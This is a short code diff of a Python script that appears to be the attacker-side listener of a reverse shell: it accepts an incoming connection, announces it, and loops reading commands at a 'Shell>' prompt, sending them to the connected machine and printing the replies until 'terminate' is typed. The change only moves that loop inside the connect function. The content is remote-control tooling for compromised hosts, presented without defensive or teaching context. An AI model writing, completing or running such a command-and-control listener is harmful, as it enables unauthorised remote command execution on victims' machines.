@@ -9,15 +9,15 @@ def connect():
     conn, addr = s.accept()
     print('[+] We got a connection from: ', addr)
 
-while True:
-    command = input('Shell> ')
-    if 'terminate' in command:
-        conn.send('terminate')
-        conn.close()
-        break
-    else:
-        conn.send(command)
-        print(conn.recv(1024))
+    while True:
+        command = input('Shell> ')
+        if 'terminate' in command:
+            conn.send('terminate')
+            conn.close()
+            break
+        else:
+            conn.send(command)
+            print(conn.recv(1024))
 
 def main ():
     connect()
